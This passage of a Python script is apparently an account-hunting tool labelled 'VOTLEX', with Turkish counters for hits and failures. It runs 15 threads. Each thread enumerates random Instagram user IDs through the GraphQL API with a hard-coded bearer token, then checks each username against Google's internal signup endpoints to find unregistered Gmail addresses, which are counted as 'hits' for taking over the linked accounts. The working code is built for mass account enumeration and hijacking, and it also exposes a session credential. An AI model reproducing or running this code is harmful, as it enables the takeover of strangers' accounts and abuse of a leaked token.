        res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
        tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
        data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
        tl=str(response.text).split('",null,"')[1].split('"')[0]
        host=response.cookies.get_dict()['__Host-GAPS']
        if'@'in email:email=str(email).split('@')[0]
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
        params={'TL':tl}
        data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
        response = requests.post(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data
).text

        if '"gf.uar",1' in response:
            votlex_insta(email)
            basarli_gmail += 1
            os.system('clear')
            print(f''' 
ùêÉùêÑùêïùêÑùêãùêéùêèùêÑùêë ¬´¬´¬´(ùêïùêéùêìùêãùêÑùêó)¬ª¬ª¬ª¬ª
___________________________________
(1) : {F}BA≈ûARLI ƒ∞G  (Hƒ∞T) {B}{basarli_ig}
(2) : {E}HATALI ƒ∞G {a6}{hatali_ig}
(3) : {a2}BA≈ûARLI GMAƒ∞L {a2}{basarli_gmail}
(4) : {E}HATALI GMAƒ∞L {a5}{hatali_gmail}
(9) : {X}CHECKLENEN EMAƒ∞L {email} ''')

        elif '"gf.uar",2' in response or '"gf.uar",3' in response:
            hatali_gmail += 1
            os.system('clear')
            print(f''' 
ùêÉùêÑùêïùêÑùêãùêéùêèùêÑùêë ¬´¬´¬´¬´(ùêïùêéùêìùêãùêÑùêó)¬ª¬ª¬ª¬ª¬ª
___________________________________
(1) : {F}BA≈ûARLI ƒ∞G  (Hƒ∞T) {B}{basarli_ig}
(2) : {E}HATALI ƒ∞G {a6}{hatali_ig}
(3) : {a2}BA≈ûARLI GMAƒ∞L {a2}{basarli_gmail}
(4) : {E}HATALI GMAƒ∞L {a5}{hatali_gmail}
(9) : {X}CHECKLENEN EMAƒ∞L {email} ''')
    
    except Exception as e:
        print(e)
    return False
  


HEADERS = {"x-bloks-version-id":"8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","user-agent":"Instagram 275.0.0.27.98 Android (28/9; 240dpi; 720x1280; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 458229258)","authorization":"Bearer IGT:2:eyJkc191c2VyX2lkIjoiNTI1MjEwODYyODIiLCJzZXNzaW9uaWQiOiI1MjUyMTA4NjI4MiUzQUt4VGg2UUFzam5teVlIJTNBMjUlM0FBWWQtcXhaZGRTanNyQ3o2eW1ud0NuUGNINFpwbVd1a0JMN2p4Wm5Gb2cifQ=="}

        
def tkip():
    while True:
        try:
            user_id = str(random.randrange(15000000, 240205236))[:].zfill(8)  
            data = {
                "lsd": user_id,
                "variables": '{"id":"' + user_id + '","render_surface":"PROFILE"}',
                "server_timestamps": 'true',
                "doc_id": '25313068075003303'
            }
            HEADERS['X-Fb-Lsd'] = user_id
            response = requests.post("https://www.instagram.com/api/graphql", headers=HEADERS, data=data).json()
            if 'data' in response and 'user' in response['data'] and 'username' in response['data']['user']:
                username = response['data']['user']['username']
                email = username
                votlex_gmail(email)
        except Exception:
            continue

                     
def hiz(vtl):
    for _ in range(vtl):
        Thread(target=tkip).start()
if __name__ == "__main__":
    hiz(15)
